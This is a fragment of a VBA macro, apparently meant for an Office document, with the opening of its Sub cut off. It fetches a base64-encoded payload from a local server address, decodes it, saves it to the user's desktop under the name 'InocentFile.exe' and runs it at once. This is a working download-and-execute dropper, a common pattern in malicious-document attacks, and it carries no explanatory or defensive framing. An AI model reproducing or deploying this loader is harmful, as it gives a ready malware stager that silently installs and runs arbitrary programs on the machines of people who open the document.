' Declare variables
    Dim WinHttpReq As Object
    Dim FileStream As Object
    Dim Base64Encoded As String
    Dim BinaryData As Variant
    Dim URL As String
    Dim FilePath As String
    Dim DesktopPath As String
    Dim FileName As String
    
    ' URL of the file to be downloaded (Base64-encoded)
    URL = "http://localhost:6000/install"

    ' File name to save as
    FileName = "InocentFile.exe"
    
    ' Get the path to the desktop
    DesktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
    FilePath = DesktopPath & "\" & FileName
    
    ' Create the HTTP request object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    ' Open the HTTP connection
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.Send
    
    ' Check if the request was successful
    If WinHttpReq.Status = 200 Then
        ' Get the base64-encoded response text
        Base64Encoded = WinHttpReq.responseText
        
        ' Decode base64 to binary data
        BinaryData = Base64Decode(Base64Encoded)
        
        ' Save the binary data to a file
        Set FileStream = CreateObject("ADODB.Stream")
        FileStream.Type = 1 ' Binary
        FileStream.Open
        FileStream.Write BinaryData
        FileStream.SaveToFile FilePath, 2 ' Save binary data to file
        FileStream.Close
        
        ' Execute the file
        Shell FilePath, vbNormalFocus
    Else
        MsgBox "Failed to download file. Status: " & WinHttpReq.Status
    End If
    
    ' Cleanup
    Set WinHttpReq = Nothing
    Set FileStream = Nothing

End Sub

Function Base64Decode(ByVal base64String As String) As Variant
    ' This function decodes a base64 string to binary data
    Dim objXML As Object
    Dim objNode As Object
    
    ' Create an XML document and a node
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    
    ' Assign the base64 string to the node's dataType and text properties
    objNode.DataType = "bin.base64"
    objNode.Text = base64String
    
    ' Return the binary data
    Base64Decode = objNode.nodeTypedValue
End Function